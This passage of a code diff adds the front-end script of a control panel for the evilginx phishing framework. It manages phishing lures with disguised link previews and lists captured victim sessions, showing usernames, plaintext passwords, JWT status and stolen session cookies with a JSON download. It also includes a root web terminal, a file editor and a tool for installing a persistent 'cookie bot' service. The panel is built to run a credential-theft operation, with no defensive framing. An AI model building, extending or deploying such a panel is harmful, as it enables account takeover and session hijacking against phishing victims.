onclick="saveLure(${idx})">SAVE</button> <button class="btn" onclick="closeModal()">CANCEL</button>`)}
+async function saveLure(idx){const data={index:idx,phishlet:$('#elPhishlet').value,path:$('#elPath').value,redirect_url:$('#elRedirect').value,ua_filter:$('#elUa').value,og_title:$('#elOgTitle').value,og_desc:$('#elOgDesc').value,og_image:$('#elOgImg').value,og_url:$('#elOgUrl').value};const r=await api('/api/lures',{method:'PUT',body:JSON.stringify(data)});if(r.ok){closeModal();toast('Lure updated');loadLures()}else toast(r.error||'Error','err')}
+async function deleteLure(idx){if(!confirm(`Delete lure #${idx}?`))return;const r=await api('/api/lures',{method:'DELETE',body:JSON.stringify({index:idx})});if(r.ok){toast('Deleted');loadLures()}else toast(r.error||'Error','err')}
+function copyUrl(url){if(navigator.clipboard&&window.isSecureContext){navigator.clipboard.writeText(url).then(()=>toast('URL copied!')).catch(()=>toast('Copy failed','err'))}else{const ta=document.createElement('textarea');ta.value=url;ta.style.cssText='position:fixed;left:-9999px';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');toast('URL copied!')}catch(e){toast('Copy failed','err')}document.body.removeChild(ta)}}
+async function loadSessions(filter){if(!filter)filter=currentSessFilter||'all';currentSessFilter=filter;var ldr=document.getElementById('sessLoader');if(ldr)ldr.classList.add('show');$('#sessCount').textContent='Loading...';try{const ss=await api('/api/sessions?filter='+filter);let html='';ss.forEach(s=>{html+=`<tr><td>${s.id}</td><td>${esc(s.phishlet)}</td><td>${esc(s.remote_addr)}</td><td>${s.n_cookies||0}</td><td>${s.has_jwt?'<span class="badge jwt">JWT</span>':'<span class="badge off">NO</span>'}</td><td>${esc(s.username||'\u2014')}</td><td>${esc(s.password||'\u2014')}</td><td>${ts(s.create_time)}</td><td><div class="btn-group"><button class="btn sm" onclick="viewSession(${s.id})"><i class="fa-solid fa-eye"></i> View</button><button class="btn sm danger" onclick="deleteSession(${s.id})"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`});if(!html)html='<tr><td colspan="9" style="text-align:center;color:var(--text3)">No sessions</td></tr>';$('#sessionsBody').innerHTML=html;$('#sessCount').textContent='Showing '+ss.length+' sessions ('+filter+')'}finally{if(ldr)ldr.classList.remove('show')}}
+function searchSessions(q){q=q.toLowerCase().trim();document.querySelectorAll('#sessionsBody tr').forEach(function(r){if(!q){r.style.display='';return}r.style.display=r.textContent.toLowerCase().includes(q)?'':'none'})}
+var currentSessFilter='all';function filterSessions(f,btn){document.querySelectorAll('.sessFilter').forEach(b=>b.classList.remove('active'));if(btn)btn.classList.add('active');loadSessions(f)}
+
+async function viewSession(id){const s=await api(`/api/sessions/${id}`);if(s.error)return toast(s.error,'err');let cookieHtml='';for(const[dom,cks]of Object.entries(s.tokens||{})){for(const[cn,ci]of Object.entries(cks)){const val=ci.Value||ci.value||'';cookieHtml+=`<tr><td style="color:var(--cyan)">${esc(dom)}</td><td style="color:var(--accent)">${esc(cn)}</td><td>${esc(val.substring(0,120))}${val.length>120?'\u2026':''}</td></tr>`}}openModal(`SESSION #${id}`,`<div class="detail-grid"><div class="lbl">ID</div><div class="val">${s.id}</div><div class="lbl">Phishlet</div><div class="val">${esc(s.phishlet)}</div><div class="lbl">Remote IP</div><div class="val">${esc(s.remote_addr)}</div><div class="lbl">Landing URL</div><div class="val">${esc(s.landing_url)}</div><div class="lbl">User Agent</div><div class="val" style="font-size:12px">${esc(s.useragent)}</div><div class="lbl">Created</div><div class="val">${ts(s.create_time)}</div><div class="lbl">Updated</div><div class="val">${ts(s.update_time)}</div><div class="lbl">Has JWT</div><div class="val">${s.has_jwt?'<span class="badge jwt">YES</span>':'<span class="badge off">NO</span>'}</div></div><div class="sec-title" style="font-size:13px"><i class="fa-solid fa-cookie-bite"></i> Captured Cookies (${s.n_cookies})</div><div class="tbl-wrap"><table class="cookie-tbl"><thead><tr><th>Domain</th><th>Name</th><th>Value</th></tr></thead><tbody>${cookieHtml||'<tr><td colspan="3" style="text-align:center;color:var(--text3)">No cookies</td></tr>'}</tbody></table></div>`,`<button class="btn fill" onclick="downloadCookieJson(${id})"><i class="fa-solid fa-cloud-arrow-down"></i> Download JSON</button><button class="btn" onclick="closeModal()">CLOSE</button>`)}
+async function startEvilginx(){toast('Starting...');const r=await api('/api/ev/start',{method:'POST'});if(r.ok){toast('Started');updateEvStatus(r.running)}else toast('Failed','err')}
+async function stopEvilginx(){if(!confirm('Stop evilginx?'))return;toast('Stopping...');const r=await api('/api/ev/stop',{method:'POST'});if(r.ok){toast('Stopped');updateEvStatus(false)}}
+async function restartEvilginx(){toast('Restarting...');const r=await api('/api/ev/restart',{method:'POST'});if(r.ok){toast('Restarted');updateEvStatus(r.running)}else toast('Failed','err')}
+function initTerminal(){if(termReady){fitAddon.fit();return}term=new Terminal({cursorBlink:true,cursorStyle:'bar',fontSize:15,fontFamily:"'JetBrains Mono',monospace",theme:{background:'#0a0e17',foreground:'#00ff88',cursor:'#00ff88',cursorAccent:'#0a0e17',selectionBackground:'rgba(0,255,136,0.15)',black:'#0a0e17',red:'#ef4444',green:'#00ff88',yellow:'#f59e0b',blue:'#22d3ee',magenta:'#a78bfa',cyan:'#22d3ee',white:'#94a3b8',brightBlack:'#475569',brightRed:'#f87171',brightGreen:'#4ade80',brightYellow:'#fbbf24',brightBlue:'#67e8f9',brightMagenta:'#c4b5fd',brightCyan:'#67e8f9',brightWhite:'#f1f5f9'}});fitAddon=new FitAddon.FitAddon();term.loadAddon(fitAddon);term.open($('#terminal-container'));fitAddon.fit();termReady=true;term.onData(data=>{socket.emit('term_in',{d:data})});socket.on('term_out',msg=>{term.write(msg.d)});window.addEventListener('resize',()=>{if(termReady)fitAddon.fit()});new ResizeObserver(()=>{if(termReady){fitAddon.fit();socket.emit('term_resize',{rows:term.rows,cols:term.cols})}}).observe($('#terminal-container'))}
+
+function attachFindReplace(root){
+  if(!root)return;
+  root.querySelectorAll('textarea').forEach(function(ta){
+    if(ta.dataset.frAttached)return;
+    ta.dataset.frAttached='1';
+    var bar=document.createElement('div');
+    bar.className='fr-bar';
+    bar.innerHTML='<div class="fr-field"><label>Find</label><input class="fr-find" placeholder="Find..."></div><div class="fr-field"><label>Replace</label><input class="fr-repl" placeholder="Replace with..."></div><button type="button" class="btn fill fr-go"><i class="fa-solid fa-arrows-rotate"></i> Replace All</button>';
+    ta.parentNode.insertBefore(bar, ta);
+    var find=bar.querySelector('.fr-find');
+    var repl=bar.querySelector('.fr-repl');
+    var go=bar.querySelector('.fr-go');
+    function doReplace(){
+      var f=find.value;
+      if(!f){toast('Enter text to find','err');find.focus();return;}
+      var src=ta.value;
+      var count=0, idx=0;
+      while((idx=src.indexOf(f, idx))!==-1){count++;idx+=f.length;}
+      if(!count){toast('No matches found','err');return;}
+      ta.value=src.split(f).join(repl.value);
+      ta.dispatchEvent(new Event('input',{bubbles:true}));
+      toast(count+' replacement'+(count===1?'':'s'));
+    }
+    go.addEventListener('click', doReplace);
+    find.addEventListener('keydown', function(e){if(e.key==='Enter'){e.preventDefault();doReplace();}});
+    repl.addEventListener('keydown', function(e){if(e.key==='Enter'){e.preventDefault();doReplace();}});
+  });
+}
+
+var fePath='/root', feSel=null, svcFilter='running';
+function feFmtSize(n){if(n==null)return'\u2014';n=Number(n)||0;if(n<1024)return n+' B';if(n<1048576)return (n/1024).toFixed(1)+' KB';return (n/1048576).toFixed(1)+' MB'}
+function feCrumbs(path){var parts=path.split('/').filter(Boolean);var acc='';var h='<span class="fe-crumb" onclick="feGo(\'/\')">/</span>';parts.forEach(function(p){acc+='/'+p;h+='<span class="fe-sep">/</span><span class="fe-crumb" onclick="feGo(\''+acc.replace(/\\/g,'\\\\').replace(/'/g,"\\'")+'\')">'+esc(p)+'</span>'});$('#feCrumbs').innerHTML=h}
+function feEscAttr(s){return String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/"/g,'&quot;')}
+async function loadFiles(path){if(path)fePath=path;feSel=null;const d=await api('/api/fs?path='+encodeURIComponent(fePath));if(d.error){toast(d.error,'err');return}fePath=d.path;feCrumbs(d.path);var h='';(d.entries||[]).forEach(function(e){var ico=e.is_dir?'fa-folder':'fa-file-lines';var cls=e.is_dir?'dir':'file';var ap=feEscAttr(e.path);h+='<tr class="fe-row" ondblclick="feOpen(\''+ap+'\','+(e.is_dir?1:0)+')" onclick="feSelect(this,\''+ap+'\','+(e.is_dir?1:0)+')"><td style="text-align:left"><i class="fa-solid '+ico+' fe-ico '+cls+'"></i>'+esc(e.name)+(e.is_link?' <span class="badge jwt">link</span>':'')+'</td><td>'+(e.is_dir?'\u2014':feFmtSize(e.size))+'</td><td>'+ts(e.mtime)+'</td><td>'+esc(e.mode||'')+'</td></tr>'});if(!h)h='<tr><td colspan="4" style="text-align:center;color:var(--text3)">Empty folder</td></tr>';$('#feBody').innerHTML=h}
+function feSelect(tr,path,isDir){document.querySelectorAll('#feBody tr').forEach(function(x){x.classList.remove('sel')});tr.classList.add('sel');feSel={path:path,isDir:!!isDir}}
+function feOpen(path,isDir){if(isDir)loadFiles(path);else feEdit(path)}
+function feGo(path){loadFiles(path)}
+function feGoUp(){if(!fePath||fePath==='/')return;var p=fePath.replace(/\/+$/,'').split('/');p.pop();loadFiles(p.join('/')||'/')}
+async function feEdit(path){const r=await api('/api/fs/read?path='+encodeURIComponent(path));if(r.error)return toast(r.error,'err');var name=path.split('/').pop();openModal('EDIT: '+name,'<div class="field"><label>Path</label><input id="feEdPath" value="'+esc(path)+'" readonly></div><div class="field" style="margin-top:12px"><label>Content</label><textarea id="feEdContent" style="min-height:380px">'+esc(r.content||'')+'</textarea></div>','<button class="btn fill" onclick="feSave()"><i class="fa-solid fa-floppy-disk"></i> SAVE</button> <button class="btn" onclick="closeModal()">CANCEL</button>')}
+async function feSave(){var path=$('#feEdPath').value;var content=$('#feEdContent').value;const r=await api('/api/fs/write',{method:'PUT',body:JSON.stringify({path:path,content:content})});if(r.ok){closeModal();toast('Saved');loadFiles()}else toast(r.error||'Error','err')}
+function feNewFile(){openModal('NEW FILE','<div class="field"><label>File name</label><input id="feNewName" placeholder="script.py"></div><div class="field" style="margin-top:12px"><label>Content</label><textarea id="feNewContent" style="min-height:220px"></textarea></div>','<button class="btn fill" onclick="feCreateFile()">CREATE</button> <button class="btn" onclick="closeModal()">CANCEL</button>')}
+async function feCreateFile(){var n=($('#feNewName').value||'').trim();if(!n||n.indexOf('/')>=0)return toast('Invalid name','err');var path=fePath.replace(/\/+$/,'')+'/'+n;const r=await api('/api/fs/write',{method:'PUT',body:JSON.stringify({path:path,content:$('#feNewContent').value||''})});if(r.ok){closeModal();toast('Created');loadFiles();feEdit(path)}else toast(r.error||'Error','err')}
+function feNewDir(){openModal('NEW FOLDER','<div class="field"><label>Folder name</label><input id="feDirName" placeholder="myfolder"></div>','<button class="btn fill" onclick="feCreateDir()">CREATE</button> <button class="btn" onclick="closeModal()">CANCEL</button>')}
+async function feCreateDir(){var n=($('#feDirName').value||'').trim();if(!n||n.indexOf('/')>=0)return toast('Invalid name','err');var path=fePath.replace(/\/+$/,'')+'/'+n;const r=await api('/api/fs/mkdir',{method:'POST',body:JSON.stringify({path:path})});if(r.ok){closeModal();toast('Folder created');loadFiles()}else toast(r.error||'Error','err')}
+function feMakeService(){if(!feSel||feSel.isDir){toast('Select a file first','err');return}openNewService(feSel.path)}
+function filterServices(f,btn){document.querySelectorAll('[data-svc]').forEach(function(b){b.classList.remove('active')});if(btn)btn.classList.add('active');svcFilter=f;loadServices()}
+async function loadServices(){const ss=await api('/api/services?filter='+(svcFilter||'running'));var h='';(ss||[]).forEach(function(s){var on=s.active==='active';var en=s.enabled==='enabled';h+='<tr><td style="text-align:left"><strong style="color:var(--cyan)">'+esc(s.name)+'</strong>'+(s.custom?' <span class="badge on">CUSTOM</span>':'')+'</td><td><span class="svc-dot '+(on?'on':'off')+'"></span>'+(on?'<span class="badge on">RUNNING</span>':'<span class="badge off">'+esc(s.active||'inactive')+'</span>')+'</td><td>'+(en?'<span class="badge on">ENABLED</span>':'<span class="badge off">'+esc(s.enabled||'disabled')+'</span>')+'</td><td>'+esc(s.pid&&s.pid!=='0'?s.pid:'\u2014')+'</td><td>'+esc(s.description||'\u2014')+'</td><td><div class="btn-group">'+(on?'<button class="btn sm danger" onclick="svcAct(\''+s.name+'\',\'stop\')">Stop</button>':'<button class="btn sm fill" onclick="svcAct(\''+s.name+'\',\'start\')">Start</button>')+'<button class="btn sm" onclick="svcAct(\''+s.name+'\',\'restart\')"><i class="fa-solid fa-arrows-rotate"></i></button>'+(en?'<button class="btn sm" onclick="svcAct(\''+s.name+'\',\'disable\')">Disable</button>':'<button class="btn sm" onclick="svcAct(\''+s.name+'\',\'enable\')">Enable</button>')+'<button class="btn sm" onclick="svcLogs(\''+s.name+'\')"><i class="fa-solid fa-scroll"></i></button>'+(s.custom?'<button class="btn sm danger" onclick="svcDelete(\''+s.name+'\')"><i class="fa-solid fa-trash-can"></i></button>':'')+'</div></td></tr>'});if(!h)h='<tr><td colspan="6" style="text-align:center;color:var(--text3)">No services</td></tr>';$('#svcBody').innerHTML=h;$('#svcCount').textContent='Showing '+(ss||[]).length+' services ('+svcFilter+')'}
+async function svcAct(name,act){const r=await api('/api/services/'+encodeURIComponent(name)+'/'+act,{method:'POST',body:'{}'});if(r.error)toast(r.error,'err');else{toast(name+' '+act);loadServices()}}
+async function svcLogs(name){const r=await api('/api/services/'+encodeURIComponent(name)+'/logs');openModal('LOGS \u2014 '+name,'<div class="log-view">'+esc(r.logs||'(no logs)')+'</div>','<button class="btn cyan" onclick="svcLogs(\''+name+'\')"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button><button class="btn" onclick="closeModal()">CLOSE</button>')}
+function svcDelete(name){openModal('DELETE SERVICE','<p style="color:#fff;margin-bottom:12px">Stop, disable and remove <strong style="color:var(--cyan)">'+esc(name)+'</strong>?</p><p style="color:var(--text3);font-size:13px">Only custom units in /etc/systemd/system/ can be deleted. The script file is kept.</p>','<button class="btn danger" onclick="doSvcDelete(\''+name+'\')">DELETE</button><button class="btn" onclick="closeModal()">CANCEL</button>')}
+async function doSvcDelete(name){const r=await api('/api/services/'+encodeURIComponent(name),{method:'DELETE'});closeModal();if(r.ok){toast('Deleted');loadServices()}else toast(r.error||'Error','err')}
+function openNewService(preFile){openModal('NEW SERVICE','<div class="template-hint"><strong style="color:var(--accent)">i</strong> Creates a systemd unit: optional copy to <code>/usr/local/bin</code>, write service file, daemon-reload, enable, start.</div><div class="form-grid"><div class="field"><label>Service Name</label><input id="svName" placeholder="evilginx-cookie-bot"></div><div class="field"><label>Description</label><input id="svDesc" placeholder="Evilginx Cookie Bot Service"></div><div class="field" style="grid-column:1/-1"><label>Script File</label><input id="svFile" placeholder="/root/evilginx_cookie_bot.py" value="'+esc(preFile||'')+'"></div><div class="field"><label>Interpreter</label><select id="svInterp"><option value="auto">auto (.py / .sh / binary)</option><option value="python3">python3</option><option value="bash">bash</option><option value="exec">run file as-is</option></select></div><div class="field"><label>User</label><input id="svUser" value="root"></div><div class="field"><label>Working Directory</label><input id="svWork" placeholder="/root"></div><div class="field"></div></div><div style="display:flex;flex-direction:column;gap:12px;margin-top:8px"><label class="toggle-row"><input type="checkbox" id="svCopy" class="toggle-input" checked><span class="toggle-switch"></span><span class="toggle-label">Copy script to /usr/local/bin</span></label><label class="toggle-row"><input type="checkbox" id="svEnable" class="toggle-input" checked><span class="toggle-switch"></span><span class="toggle-label">Enable autostart</span></label><label class="toggle-row"><input type="checkbox" id="svStart" class="toggle-input" checked><span class="toggle-switch"></span><span class="toggle-label">Start now</span></label></div>','<button class="btn fill" onclick="createService()"><i class="fa-solid fa-gears"></i> CREATE & START</button><button class="btn" onclick="closeModal()">CANCEL</button>')}
+async function createService(){var name=($('#svName').value||'').trim();var file=($('#svFile').value||'').trim();if(!name)return toast('Service name required','err');if(!file)return toast('Script path required','err');var data={name:name,file:file,description:($('#svDesc').value||'').trim(),interpreter:$('#svInterp').value,user:($('#svUser').value||'root').trim(),workdir:($('#svWork').value||'').trim(),copy_to_bin:$('#svCopy').checked,enable:$('#svEnable').checked,start:$('#svStart').checked};const r=await api('/api/services',{method:'POST',body:JSON.stringify(data)});if(r.error){toast(r.error,'err');return}closeModal();toast('Service '+name+' created');svcFilter='custom';document.querySelectorAll('[data-svc]').forEach(function(b){b.classList.toggle('active',b.getAttribute('data-svc')==='custom')});loadServices()}
+
+function deleteSession(id){openModal('DELETE SESSION','<p style="color:#fff;margin-bottom:12px">Delete session <strong style="color:var(--cyan)">#'+id+'</strong> from the database?</p><p style="color:var(--text3);font-size:13px">The rest of the database stays intact.</p>','<button class="btn danger" onclick="doDeleteSession('+id+')"><i class="fa-solid fa-trash-can"></i> DELETE</button><button class="btn" onclick="closeModal()">CANCEL</button>')}
+async function doDeleteSession(id){const r=await api('/api/sessions/'+id,{method:'DELETE'});closeModal();if(r.error)toast(r.error,'err');else{toast('Session #'+id+' deleted');loadSessions();if(document.getElementById('page-dashboard')&&document.getElementById('page-dashboard').classList.contains('active'))loadDashboard()}}
+function openClearSessions(){openModal('CLEAR DATABASE','<p style="color:#fff;margin-bottom:14px">This will delete <strong style="color:var(--red)">ALL sessions</strong> from data.db.</p><p style="color:var(--text3);font-size:13px;margin-bottom:16px">The evilginx database structure is kept (id counter). Enter the panel admin password to confirm.</p><div class="field"><label>Admin password</label><input id="clrDbPass" type="password" placeholder="••••••••"></div>','<button class="btn danger" onclick="doClearSessions()"><i class="fa-solid fa-database"></i> DELETE ALL</button><button class="btn" onclick="closeModal()">CANCEL</button>')}
+async function doClearSessions(){var pw=($('#clrDbPass').value||'');if(!pw){toast('Password required','err');return}const r=await api('/api/sessions/clear',{method:'POST',body:JSON.stringify({password:pw})});if(r.error){toast(r.error,'err');return}closeModal();toast('Database cleared');loadSessions();loadDashboard()}
+function openModal(title,body,foot=''){$('#modalTitle').textContent=title;$('#modalBody').innerHTML=body;$('#modalFoot').innerHTML=foot;$('#modalOverlay').classList.add('show');attachFindReplace($('#modalBody'));bindCardTables()}
+function closeModal(){$('#modalOverlay').classList.remove('show')}
+$('#modalOverlay').addEventListener('click',e=>{if(e.target===$('#modalOverlay'))closeModal()});
+document.addEventListener('keydown',e=>{if(e.key==='Escape')closeModal();if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='h'){var ov=$('#modalOverlay');if(ov&&ov.classList.contains('show')){e.preventDefault();var fi=ov.querySelector('.fr-find');if(fi)fi.focus();}}});
+loadDashboard();loadPhishlets();
+try{if(localStorage.getItem('sb-closed')==='1' && window.innerWidth>768)$('.app').classList.add('sb-closed')}catch(e){}
+new MutationObserver(bindCardTables).observe(document.querySelector('.content'),{childList:true,subtree:true});
+bindCardTables();
+window.addEventListener('resize', resizeCharts);
+setInterval(async()=>{const r=await api('/api/ev/status');updateEvStatus(r.running)},15000);
+</script>
+</body>
+</html>
